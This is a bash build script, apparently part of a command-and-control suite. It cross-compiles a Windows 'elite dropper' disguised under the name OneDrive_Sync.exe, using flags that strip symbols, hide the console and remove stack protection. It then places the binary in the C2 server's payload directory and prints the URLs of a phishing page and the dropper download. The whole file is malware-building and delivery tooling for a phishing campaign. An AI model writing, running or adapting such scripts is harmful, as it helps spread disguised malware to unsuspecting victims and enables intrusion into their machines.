#!/bin/bash
cd ~/C2-suite/bot_elite

echo "[*] Compilando Elite Dropper..."
x86_64-w64-mingw32-g++ -o OneDrive_Sync.exe elite_dropper.cpp \
    -lwininet -lws2_32 -s -O2 -static \
    -Wl,--subsystem,windows \
    -fno-stack-protector -fno-asynchronous-unwind-tables \
    -fomit-frame-pointer

if [ $? -eq 0 ]; then
    echo "[+] Elite Dropper compilado!"
    ls -la OneDrive_Sync.exe
    
    # Copiar al C2
    cp OneDrive_Sync.exe ~/C2-suite/c2_server/static/payloads/
    echo "[+] Copiado a static/payloads/"
    
    echo ""
    echo "=== URLs ==="
    echo "Phishing: http://192.168.1.14:8000/static/phishing_final.html"
    echo "Dropper:  http://192.168.1.14:8000/static/payloads/OneDrive_Sync.exe"
else
    echo "[-] Error"
fi
